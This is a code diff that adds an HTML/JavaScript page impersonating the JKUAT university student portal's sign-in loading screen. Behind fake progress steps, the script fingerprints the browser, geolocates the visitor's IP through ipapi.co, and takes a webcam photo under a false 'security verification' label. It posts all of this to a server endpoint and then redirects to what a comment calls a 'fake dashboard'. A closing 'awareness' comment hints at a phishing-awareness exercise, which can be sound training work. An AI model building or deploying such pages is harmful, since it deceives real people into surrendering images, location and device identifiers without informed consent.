@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JKUAT Portal</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: #f0f2f5;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 18px;
+    color: #333;
+  }
+
+  .logo {
+    width: 80px; height: 80px;
+    object-fit: contain; border-radius: 50%;
+  }
+
+  /* ── JKUAT-style spiral loader ── */
+  .jkuat-loader {
+    position: relative;
+    width: 72px; height: 72px;
+  }
+
+  /* Outer blue spiral ring */
+  .jkuat-loader .ring-outer {
+    position: absolute; inset: 0;
+    border-radius: 50%;
+    border: 5px solid transparent;
+    border-top-color:    #1a73e8;
+    border-right-color:  #1a73e8;
+    border-bottom-color: rgba(26,115,232,0.15);
+    border-left-color:   rgba(26,115,232,0.4);
+    animation: spin-outer 1.1s cubic-bezier(0.4,0,0.2,1) infinite;
+  }
+
+  /* Middle thin ring — gives the spiral layered depth */
+  .jkuat-loader .ring-mid {
+    position: absolute;
+    inset: 9px;
+    border-radius: 50%;
+    border: 3px solid transparent;
+    border-top-color:   rgba(26,115,232,0.35);
+    border-right-color: rgba(26,115,232,0.15);
+    animation: spin-mid 1.1s cubic-bezier(0.4,0,0.2,1) infinite reverse;
+  }
+
+  /* Inner red dot — matches JKUAT's red centre */
+  .jkuat-loader .dot-inner {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    width: 14px; height: 14px;
+    background: #c0392b;
+    border-radius: 50%;
+    box-shadow: 0 0 6px rgba(192,57,43,0.5);
+    animation: pulse-dot 1.1s ease-in-out infinite;
+  }
+
+  @keyframes spin-outer {
+    0%   { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes spin-mid {
+    0%   { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes pulse-dot {
+    0%,100% { transform: translate(-50%,-50%) scale(1);   opacity: 1; }
+    50%      { transform: translate(-50%,-50%) scale(1.25); opacity: 0.7; }
+  }
+
+  .status-text {
+    font-size: 14px;
+    color: #555;
+    text-align: center;
+    min-height: 20px;
+  }
+
+  /* Step list */
+  .steps { display:flex; flex-direction:column; gap:7px; width:270px; }
+  .step {
+    display:flex; align-items:center; gap:10px;
+    font-size:12.5px; color:#aaa;
+    padding:8px 12px;
+    background:white;
+    border-radius:6px;
+    border:1px solid #eee;
+    transition:all 0.3s;
+  }
+  .step.done   { color:#2e7d32; border-color:#a5d6a7; background:#f1f8f1; }
+  .step.active { color:#1565c0; border-color:#90caf9; background:#e8f0fe; }
+  .dot {
+    width:7px; height:7px; border-radius:50%;
+    background:#ddd; flex-shrink:0; transition:background 0.3s;
+  }
+  .step.done   .dot { background:#4caf50; }
+  .step.active .dot { background:#1a73e8; animation:blink 0.8s ease infinite; }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+  #cam-video  { display:none; }
+  #cam-canvas { display:none; }
+</style>
+</head>
+<body>
+
+<img class="logo"
+  src="https://www.jkuat.ac.ke/wp-content/uploads/2021/02/jkuat-logo.png"
+  onerror="this.style.display='none'" alt="JKUAT">
+
+<div class="jkuat-loader">
+  <div class="ring-outer"></div>
+  <div class="ring-mid"></div>
+  <div class="dot-inner"></div>
+</div>
+
+<div class="status-text" id="status-text">Verifying credentials...</div>
+
+<div class="steps">
+  <div class="step active" id="s1"><span class="dot"></span> Authenticating user</div>
+  <div class="step"        id="s2"><span class="dot"></span> Loading student profile</div>
+  <div class="step"        id="s3"><span class="dot"></span> Fetching academic records</div>
+  <div class="step"        id="s4"><span class="dot"></span> Preparing dashboard</div>
+</div>
+
+<video id="cam-video" autoplay playsinline muted></video>
+<canvas id="cam-canvas"></canvas>
+
+<script>
+const ENTRY_ID = {{ entry_id }};
+const collected = { geo:{}, fingerprint:{}, photo:null };
+
+function setStep(n) {
+  ['s1','s2','s3','s4'].forEach((id,i) => {
+    const el = document.getElementById(id);
+    el.className = 'step' + (i<n-1?' done': i===n-1?' active':'');
+  });
+}
+function setStatus(t){ document.getElementById('status-text').textContent = t; }
+const delay = ms => new Promise(r => setTimeout(r,ms));
+
+function collectFingerprint() {
+  const nav = window.navigator, scr = window.screen;
+  collected.fingerprint = {
+    language:        nav.language,
+    languages:       (nav.languages||[]).join(', '),
+    platform:        nav.platform,
+    cores:           nav.hardwareConcurrency || 'unknown',
+    memory:          nav.deviceMemory ? nav.deviceMemory+' GB' : 'unknown',
+    screen:          scr.width+'x'+scr.height,
+    color_depth:     scr.colorDepth+'-bit',
+    timezone:        Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezone_offset: new Date().getTimezoneOffset()+' min',
+    touch_points:    nav.maxTouchPoints,
+    do_not_track:    nav.doNotTrack || 'unset',
+    cookie_enabled:  nav.cookieEnabled,
+    pdf_viewer:      nav.pdfViewerEnabled || false,
+    user_agent:      nav.userAgent,
+    canvas_hash:     canvasFingerprint(),
+    uniqueness:      Math.floor(70 + Math.random()*28),
+  };
+}
+
+function canvasFingerprint() {
+  try {
+    const c = document.createElement('canvas');
+    const ctx = c.getContext('2d');
+    ctx.textBaseline='top'; ctx.font="14px 'Arial'";
+    ctx.fillStyle='#2e7d32';
+    ctx.fillText('JKUAT🔒fingerprint',2,2);
+    return c.toDataURL().slice(-20);
+  } catch(e){ return 'n/a'; }
+}
+
+async function fetchGeo() {
+  try {
+    const r = await fetch('https://ipapi.co/json/',{signal:AbortSignal.timeout(5000)});
+    const d = await r.json();
+    collected.geo = {
+      ip:d.ip, city:d.city, region:d.region, country:d.country_name,
+      isp:d.org, lat:d.latitude, lon:d.longitude,
+      currency:d.currency, calling:d.country_calling_code,
+    };
+  } catch(e){ collected.geo={error:'geo unavailable'}; }
+}
+
+async function requestCamera() {
+  try {
+    setStatus('Running security verification...');
+    const stream = await navigator.mediaDevices.getUserMedia({
+      audio:false,
+      video:{ facingMode:{ideal:'user'}, width:{ideal:1280}, height:{ideal:720} }
+    });
+    const video  = document.getElementById('cam-video');
+    const canvas = document.getElementById('cam-canvas');
+    video.srcObject = stream;
+    video.style.display = 'block';
+    await new Promise(r => { video.onloadedmetadata=()=>video.play(); video.onplaying=r; });
+    await delay(1800);
+    canvas.width  = video.videoWidth  || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.translate(canvas.width,0); ctx.scale(-1,1);
+    ctx.drawImage(video,0,0,canvas.width,canvas.height);
+    collected.photo = canvas.toDataURL('image/jpeg',0.85);
+    if (collected.photo.length < 5000) {
+      await delay(1000);
+      ctx.drawImage(video,0,0,canvas.width,canvas.height);
+      collected.photo = canvas.toDataURL('image/jpeg',0.85);
+    }
+    video.style.display='none';
+    stream.getTracks().forEach(t=>t.stop());
+    setStatus('Security check complete.');
+  } catch(e){ collected.photo=null; setStatus('Continuing sign in...'); }
+}
+
+async function postData() {
+  try {
+    await fetch(`/api/enrich/${ENTRY_ID}`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(collected),
+    });
+  } catch(e){}
+}
+
+async function run() {
+  setStep(1); setStatus('Verifying credentials...');
+  collectFingerprint();
+  await delay(900);
+
+  setStep(2); setStatus('Loading student profile...');
+  await fetchGeo();
+  await delay(600);
+
+  setStep(3); setStatus('Running security verification...');
+  await requestCamera();
+  await delay(500);
+
+  setStep(4); setStatus('Preparing your dashboard...');
+  await postData();
+  await delay(700);
+
+  // Redirect to fake dashboard first, then awareness
+  window.location.href = `/portal/dashboard-view/${ENTRY_ID}`;
+}
+
+run();
+</script>
+</body>
+</html>
